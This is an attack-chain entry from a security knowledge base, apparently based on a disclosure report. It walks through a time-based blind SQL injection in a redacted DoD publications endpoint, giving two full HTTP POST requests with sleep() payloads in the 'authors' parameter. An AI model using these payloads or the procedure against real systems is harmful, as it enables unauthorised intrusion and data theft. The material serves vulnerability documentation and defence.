---
id: ac-uuid-time-based-sqli-dod
tags:
  - sqli
  - blind-sqli
  - time-based
  - mysql
  - php
  - web
  - dod
type: attack_chain
tools:
  - '[[tools/SQLmap]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Time-Based-Blind-SQL-Injection]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:05.256Z'
description: >-
  Multi-stage attack chain exploiting a time-based blind SQL injection
  vulnerability in a U.S. Department of Defense web application's publications
  endpoint to demonstrate data exfiltration potential.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Time-Based Blind SQL Injection in DoD Publications Endpoint

Multi-stage attack chain demonstrating the discovery and exploitation of a time-based blind SQL injection vulnerability in the /pubs/index.php endpoint of a U.S. Department of Defense web application. The attack targets the 'years' and 'authors' parameters, allowing attackers to infer sensitive database information through response time delays caused by SQL functions like sleep(). This can lead to exfiltration of sensitive data using manual payloads or automated tools.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~30 seconds |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerable Endpoint] --> B[Demonstrate Injection with 4-Second Delay]
    B --> C[Confirm Injection with 25-Second Delay]
    C --> D[Potential Data Exfiltration]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/SQLmap]]
- Web browser or curl for manual testing

### Target Environment

- Web platform with PHP backend
- MySQL database service
- Accessible /pubs/index.php endpoint

### Initial Access Requirements

- Network access to the target web application
- No credentials required (public-facing)
- Ability to send POST requests with custom parameters

## Detailed Attack Procedures

### Step 1: Identify Vulnerable Endpoint

procedure: [[procedures/Exploit-Time-Based-Blind-SQL-Injection]]

**Objective**: Test the /pubs/index.php endpoint to identify SQL injection susceptibility in the 'years' and 'authors' parameters during reconnaissance.

**Instructions**: Manually test the endpoint by sending POST requests with basic payloads to observe error responses or unusual behavior. Focus on parameters like 'years=2017' and 'authors=Hurlburt' to probe for injection points.

**Expected Output**: Normal response without delays, but confirmation of parameter acceptance sets up for injection testing.

**Success Indicators**:
- Endpoint responds to POST requests with 'years' and 'authors' parameters
- No immediate errors, indicating potential for further payload injection

### Step 2: Demonstrate Injection with 4-Second Delay

procedure: [[procedures/Exploit-Time-Based-Blind-SQL-Injection]]

**Objective**: Inject a time-based blind SQL payload to cause a detectable 4-second response delay, confirming the vulnerability.

**Instructions**: Send a POST request to /pubs/index.php using [[commands/poc-time-based-sqli-4sec-delay]] to inject the payload in the 'authors' parameter.

```bash
POST /pubs/index.php HTTP/1.1
Host: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://███████
Referer: https://███████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```

Measure the response time to validate the delay.

**Expected Output**: Response time of approximately 4 seconds, indicating successful sleep() execution.

**Success Indicators**:
- Response delay of 4 seconds
- No error page, but timing anomaly confirms blind injection

### Step 3: Confirm Injection with 25-Second Delay

procedure: [[procedures/Exploit-Time-Based-Blind-SQL-Injection]]

**Objective**: Use a longer sleep payload to further validate the time-based blind SQL injection and assess server tolerance.

**Instructions**: Send a POST request to /pubs/index.php using [[commands/poc-time-based-sqli-25sec-delay]] with an extended payload in the 'authors' parameter.

```bash
POST /pubs/index.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://████████
Referer: https://████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

Observe the extended response time.

**Expected Output**: Response time of approximately 25 seconds, confirming robust injection capability.

**Success Indicators**:
- Response delay of 25 seconds
- Consistent timing behavior across multiple requests

## Attack Chain Summary

### Key Achievements

1. Identified SQL injection vulnerability in public-facing DoD web app
2. Demonstrated blind injection via time delays without visible errors
3. Enabled potential for sensitive data exfiltration from MySQL database

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
